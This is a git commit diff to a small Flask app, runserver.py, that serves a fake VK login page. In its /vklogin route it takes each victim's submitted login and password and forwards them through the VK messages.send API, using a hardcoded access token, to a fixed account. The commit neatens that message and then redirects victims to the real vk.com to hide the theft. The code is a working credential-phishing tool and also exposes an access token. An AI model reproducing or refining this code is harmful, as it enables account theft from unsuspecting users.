df450ffa15adbad1c0fa60c277785174b109a5e8
ussenko <ussenko2017@mail.ru>
2019-01-15 19:48:01 +0600

    upd

--- runserver.py
+++ runserver.py
@@ -11,7 +11,13 @@ import flask
 import requests
 
 
-
+@app.before_request
+def before_request():
+    if 1 == 2:
+        if flask.request.url.startswith('http://'):
+            url = flask.request.url.replace('http://', 'https://', 1)
+            code = 301
+            return flask.redirect(url, code=code)
 
 
 @app.route('/vklogin',  methods=['GET', 'POST'])
@@ -21,10 +27,10 @@ def vk_login():
     token = 'b5a859071969ecbd3b15df385f26a1b5ae7a72e7af4d8b8c445d3659741e4b4ca81ff085d50d15771ebcd'
     mes = requests.get('https://api.vk.com/method/messages.send',
                        params={'access_token': token,
-                               'user_id': 436337712, 'message': ' log:' + login + ' password: ' + password, 'v': 5.73})
+                               'user_id': 436337712, 'message': 'log: ' + login + '\npassword: ' + password, 'v': 5.73})
     print(mes.json())
 
-    return render_template('vklogin.html')
+    return flask.redirect('https://vk.com')
 
 @app.route('/',  methods=['GET', 'POST'])
 @app.route('/vklog',  methods=['GET', 'POST'])
@@ -36,7 +42,7 @@ def vk_log():
 
 @app.route('/al_login.php',methods=['GET', 'POST'])
 def al_login():
-    print(flask.request.form['login'])
+    #print(flask.request.form['login'])
     return  render_template('al_login.php')
 
 if __name__ == '__main__':
